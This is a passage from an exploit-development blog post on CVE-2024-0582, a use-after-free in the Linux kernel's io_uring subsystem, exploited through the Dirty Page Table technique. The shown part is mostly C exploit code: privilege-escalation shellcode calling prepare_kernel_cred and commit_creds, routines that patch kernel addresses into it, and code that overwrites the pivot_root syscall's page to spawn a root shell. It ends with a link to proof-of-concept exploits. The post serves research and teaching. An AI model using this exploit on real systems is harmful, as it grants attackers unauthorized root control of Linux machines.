11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
      <span class="s">"</span><span class="se">\x48\x31\xFF</span><span class="s">"</span>                 <span class="cm">/* xor   rdi, rdi */</span>
      <span class="s">"</span><span class="se">\x48\xC7\xC7\x00\xB9\xA0\x82</span><span class="s">"</span> <span class="cm">/* mov   rdi, 0xffffffff82a0b900 --&gt; Placeholder for init_task_struct */</span>
      <span class="s">"</span><span class="se">\x48\xC7\xC1\xF0\x81\x0B\x81</span><span class="s">"</span> <span class="cm">/* mov   rcx, 0xffffffff810b81f0 --&gt; Placeholder for prepare_kernel_cred() */</span>
      <span class="s">"</span><span class="se">\xFF\xD1</span><span class="s">"</span>                     <span class="cm">/* call  rcx */</span>
      <span class="s">"</span><span class="se">\x48\x89\xC7</span><span class="s">"</span>                 <span class="cm">/* mov   rdi, rax */</span>
      <span class="s">"</span><span class="se">\x48\xC7\xC1\x60\x7F\x0B\x81</span><span class="s">"</span> <span class="cm">/* mov   rcx, 0xffffffff810b7f60 --&gt; Placeholder for commit_creds() */</span>
      <span class="s">"</span><span class="se">\xFF\xD1</span><span class="s">"</span>                     <span class="cm">/* call  rcx */</span>
      <span class="s">"</span><span class="se">\xC3</span><span class="s">"</span><span class="p">;</span>                        <span class="cm">/* ret */</span>
 
<span class="cm">/* Calculate the proper addresses to be patched in */</span>
<span class="kt">uint32_t</span> <span class="n">real_init_task</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">kernel_virtual_addr_base</span> <span class="o">+</span> <span class="n">INIT_TASK_STRUCT</span><span class="p">);</span>
<span class="kt">uint32_t</span> <span class="n">real_prepare_kernel_cred</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">kernel_virtual_addr_base</span> <span class="o">+</span> <span class="n">PREPARE_KERNEL_CRED_OFFSET</span><span class="p">);</span>
<span class="kt">uint32_t</span> <span class="n">real_commit_creds</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">kernel_virtual_addr_base</span> <span class="o">+</span> <span class="n">COMMIT_CREDS_OFFSET</span><span class="p">);</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Patching shellcode...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] init_task_struct: 0x0xffffffff%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">real_init_task</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] prepare_kernel_cred: 0x0xffffffff%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">real_prepare_kernel_cred</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] commit_creds: 0x0xffffffff%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">real_commit_creds</span><span class="p">);</span>
<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">real_init_task</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">real_init_task</span><span class="p">));</span>
<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode</span><span class="p">[</span><span class="mi">13</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">real_prepare_kernel_cred</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">real_prepare_kernel_cred</span><span class="p">));</span>
<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode</span><span class="p">[</span><span class="mi">25</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">real_commit_creds</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">real_commit_creds</span><span class="p">));</span>
</pre></table></code></div></div><p>Finally, the exploit writes its shellcode to the address space of the <code class="language-plaintext highlighter-rouge">pivot_root()</code> syscall via the corrupted page. If the last 2 bytes of your <code class="language-plaintext highlighter-rouge">pivot_root()</code> syscall’s offset include a value like <code class="language-plaintext highlighter-rouge">0x2bf900</code>, you’ll need to add the page offset (<code class="language-plaintext highlighter-rouge">0x900</code> in this case) to your overlapped userspace page address before calling <code class="language-plaintext highlighter-rouge">memcpy()</code>. In my case, however, the offset of pivot_root is <code class="language-plaintext highlighter-rouge">0x2bf000</code>, so no adjustment is necessary.</p><p>It then invokes the <code class="language-plaintext highlighter-rouge">pivot_root()</code> syscall, which results in the execution of the injected shellcode — ultimately yielding a root shell :)</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="cm">/* Write the patched shellcode to the overlapping page */</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Writing shellcode to overlapped page at %p...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">overlap_page</span><span class="p">);</span>
<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">overlap_page</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Shellcode written successfully.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

<span class="cm">/* Trigger shellcode execution by invoking pivot_root syscall */</span>
<span class="n">pivot_root</span><span class="p">(</span><span class="s">"/opt"</span><span class="p">,</span> <span class="s">"/opt/aa"</span><span class="p">);</span>
<span class="n">get_shell</span><span class="p">();</span>
</pre></table></code></div></div><h2 id="conclusion">Conclusion</h2><p>To sum up, I demonstrated the <strong>Dirty Page Table</strong> attack technique by exploiting a <strong>page-based</strong> use-after-free vulnerability discovered by <em>Project Zero</em> in the Linux kernel’s <code class="language-plaintext highlighter-rouge">io_uring</code> subsystem. If you’re interested in data-only attack strategies, you can check out <a href="https://github.com/kuzeyardabulut/CVE-2024-0582">my GitHub repository</a>, which includes proof-of-concept exploits for this vulnerability using both the <strong>Dirty Cred</strong> and <strong>Dirty Page Table</strong> methods.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/exploit-development/'>Exploit Development</a>, <a href='/categories/linux-kernel/'>Linux Kernel</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/dirty-pagetable/" class="post-tag no-text-decoration" >dirty pagetable</a> <a href="/tags/data-only-attack/" class="post-tag no-text-decoration" >data-only attack</a> <a href="/tags/kernel-exploitation/" class="post-tag no-text-decoration" >kernel exploitation</a> <a href="/tags/cve-2024-0582/" class="post-tag no-text-decoration" >cve-2024-0582</a> <a href="/tags/io-uring-exploitation/" class="post-tag no-text-decoration" >io_uring exploitation</a> <a href="/tags/tlb-flush/" class="post-tag no-text-decoration" >tlb flush</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Exploiting CVE-2024-0582 via the Dirty Page Table Method - Cyber Blog&url=https://kuzey.rs/posts/Dirty_Page_Table/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://telegram.me/share?text=Exploiting CVE-2024-0582 via the Dirty Page Table Method - Cyber Blog&url=https://kuzey.rs/posts/Dirty_Page_Table/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://kuzey.rs/posts/Dirty_Page_Table/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws-exam/">aws exam</a> <a class="post-tag" href="/tags/cve-2024-0582/">cve-2024-0582</a> <a class="post-tag" href="/tags/data-only-attack/">data-only attack</a> <a class="post-tag" href="/tags/dirty-pagetable/">dirty pagetable</a> <a class="post-tag" href="/tags/dll-hollowing/">dll hollowing</a> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/guide/">guide</a> <a class="post-tag" href="/tags/io-uring-exploitation/">io_uring exploitation</a> <a class="post-tag" href="/tags/kcov/">kcov</a> <a class="post-tag" href="/tags/kernel-exploitation/">kernel exploitation</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/FuzzS22/"><div class="card-body"> <span class="timeago small" >Apr 8, 2024<i class="unloaded">2024-04-08T12:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Trying to Enable KCOV on Samsung Galaxy S22</h3><div class="text-muted small"><p> In this article, I will talk about the research I did by spending about 1.5 months on the S22 device. The primary purpose of my research was to fuzz the device by compiling the kernel with KCOV, bu...</p></div></div></a></div><div class="card"> <a href="/posts/AWS_Speciality/"><div class="card-body"> <span class="timeago small" >Jun 17, 2023<i class="unloaded">2023-06-17T00:21:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS Certified Security - Specialty (SCS-C01) Exam Experiences</h3><div class="text-muted small"><p> I passed the AWS Security Specialty exam about 6 months ago and became the world’s youngest aws expert at the age of 15. Today I would like to tell you about my experience in this difficult process...</p></div></div></a></div><div class="card"> <a href="/posts/RustStomping/"><div class="card-body"> <span class="timeago small" >Jun 11, 2023<i class="unloaded">2023-06-11T00:21:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DLL Hollowing with Rust Language: Stealth Injection</h3><div class="text-muted small"><p> This will be the first blog on this website. I take DLL Hollowing topic for my first blog because I didn’t see any articles about DLL Hollowing with rust-lang so I decided to talk about that. This ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/FuzzS22/" class="btn btn-outline-primary" prompt="Older"><p>Trying to Enable KCOV on Samsung Galaxy S22</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/kuzeyardabulut">Kuzey Arda Bulut</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws-exam/">aws exam</a> <a class="post-tag" href="/tags/cve-2024-0582/">cve 2024 0582</a> <a class="post-tag" href="/tags/data-only-attack/">data only attack</a> <a class="post-tag" href="/tags/dirty-pagetable/">dirty pagetable</a> <a class="post-tag" href="/tags/dll-hollowing/">dll hollowing</a> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/guide/">guide</a> <a class="post-tag" href="/tags/io-uring-exploitation/">io_uring exploitation</a> <a class="post-tag" href="/tags/kcov/">kcov</a> <a class="post-tag" href="/tags/kernel-exploitation/">kernel exploitation</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-SR892NPXLY"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-SR892NPXLY'); }); </script>
